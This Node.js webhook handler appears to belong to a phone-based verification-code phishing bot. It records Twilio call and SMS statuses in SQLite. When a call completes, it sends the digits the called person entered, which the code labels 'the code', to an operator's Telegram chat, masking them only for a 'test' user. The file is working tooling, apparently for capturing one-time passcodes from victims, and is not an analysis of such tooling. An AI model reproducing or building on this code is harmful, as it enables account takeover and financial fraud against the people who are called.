const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();
const config = require('.././config');

module.exports = function(request, response) {
    const db = new sqlite3.Database('./db/data.db');

    var itsfrom = request.body.From || null;
    var itsto = request.body.To || null;
    var sid = request.body.CallSid;
    var date = Date.now();
    var status;
    var table = null;
    var sidname = null;

    if (sid !== undefined) {
        status = request.body.CallStatus;
        table = 'calls';
        sidname = 'callSid';
    } else {
        sid = request.body.SmsSid;
        status = request.body.SmsStatus;
        table = 'sms';
        sidname = 'smssid';
    }

    if (!itsfrom || !itsto || !sid) {
        return response.status(200).json({ error: 'Please send all the needed post data.' });
    }

    db.get(`SELECT ${sidname} FROM ${table} WHERE ${sidname} = ?`, [sid], (err, row) => {
        if (err) return console.log(err.message);

        if (!row) {
            db.run(
                `INSERT INTO ${table} (itsfrom, itsto, status, ${sidname}, date) VALUES (?, ?, ?, ?, ?)`,
                [itsfrom, itsto, status, sid, date],
                function(err) {
                    if (err) return console.log(err.message);
                    return response.status(200).json({ inserted: 'All is alright.' });
                }
            );
        } else {
            db.run(
                `UPDATE ${table} SET status = ?, itsfrom = ?, itsto = ?, date = ? WHERE ${sidname} = ?`,
                [status, itsfrom, itsto, date, sid],
                function(err) {
                    if (err) return console.log(err.message);

                    if (table === 'calls' && status === 'completed' && config.telegramBotToken && config.telegramChatId) {
                        db.get('SELECT * FROM calls WHERE callSid = ?', [sid], (err, row) => {
                            if (err) return console.error(err.message);

                            let message;
                            if (!row.digits) {
                                message = `📱:mobile phone: ${itsto}\n 📶:man detective: The user didn’t respond or enter the code.`;
                            } else {
                                let code = row.user === 'test' ? row.digits.slice(0, 3) + '***' : row.digits;
                                message = `📱:mobile phone: ${itsto}\n 📶:man detective: **${code}**`;
                            }

                            axios.post(`https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`, {
                                chat_id: config.telegramChatId,
                                text: message,
                                parse_mode: 'Markdown'
                            }).catch(error => console.log('Telegram API Error:', error.response.data));
                        });
                    }

                    return response.status(200).json({ inserted: 'All is alright.' });
                }
            );
        }
    });
};
